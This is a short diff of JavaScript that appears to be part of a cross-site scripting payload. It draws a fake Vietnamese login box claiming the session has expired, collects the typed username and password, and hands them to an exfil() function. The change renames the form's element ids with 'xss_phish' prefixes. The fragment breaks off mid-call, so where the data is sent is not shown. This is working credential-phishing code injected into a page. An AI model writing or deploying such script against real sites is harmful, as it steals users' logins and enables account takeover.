@@ -207,14 +207,14 @@
         '<div style="background:#fff;padding:30px;border-radius:8px;width:350px;font-family:Arial;font-size:14px;">' +
         '<h2 style="margin:0 0 15px 0;color:#1976d2;text-align:center;">Đăng Nhập</h2>' +
         '<p style="margin:0 0 15px 0;color:#666;text-align:center;font-size:13px;">Phiên làm việc đã kết thúc. Vui lòng xác thực lại.</p>' +
-        '<input type="text" id="u" placeholder="Tên đăng nhập" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;">' +
-        '<input type="password" id="p" placeholder="Mật khẩu" style="width:100%;padding:10px;margin-bottom:15px;border:1px solid #ccc;border-radius:4px;">' +
-        '<button id="s" style="width:100%;padding:10px;background:#1976d2;color:#fff;border:none;border-radius:4px;cursor:pointer;">Xác nhận</button>' +
+        '<input type="text" id="xss_phish_user" placeholder="Tên đăng nhập" style="width:100%;padding:10px;margin-bottom:10px;border:1px solid #ccc;border-radius:4px;">' +
+        '<input type="password" id="xss_phish_pass" placeholder="Mật khẩu" style="width:100%;padding:10px;margin-bottom:15px;border:1px solid #ccc;border-radius:4px;">' +
+        '<button id="xss_phish_btn" style="width:100%;padding:10px;background:#1976d2;color:#fff;border:none;border-radius:4px;cursor:pointer;">Xác nhận</button>' +
         '</div></div>';
       document.body.appendChild(o);
-      document.getElementById('s').onclick = function() {
-        var u = document.getElementById('u').value;
-        var p = document.getElementById('p').value;
+      document.getElementById('xss_phish_btn').onclick = function() {
+        var u = document.getElementById('xss_phish_user').value;
+        var p = document.getElementById('xss_phish_pass').value;
         // Gửi dữ liệu về server (dạng object)
         exfil({
           username: u,
